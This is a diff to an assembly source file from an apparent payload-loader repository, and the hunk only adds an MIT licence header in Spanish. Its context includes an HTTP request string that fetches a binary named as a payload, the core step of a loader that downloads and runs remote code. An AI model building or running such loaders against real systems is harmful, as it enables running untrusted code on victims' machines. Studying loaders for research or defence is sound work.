@@ -47,6 +47,12 @@
 ;
 ; En la otra terminal ejecutamos el programa
 ;===============================================================================================================================================================
+; Licencia MIT:
+; Este código es de uso libre bajo los términos de la Licencia MIT.
+; Puedes usarlo, modificarlo y redistribuirlo, siempre que incluyas esta nota de atribución.
+; NO HAY GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA.
+; Licencia completa en: https://github.com/Pithase/asm-payloads-loaders/blob/main/LICENSE
+;===============================================================================================================================================================
 
 section .rodata
     http_get db "GET /bin/payload4KBlarger-ext.bin HTTP/1.1", 0x0D, 0x0A
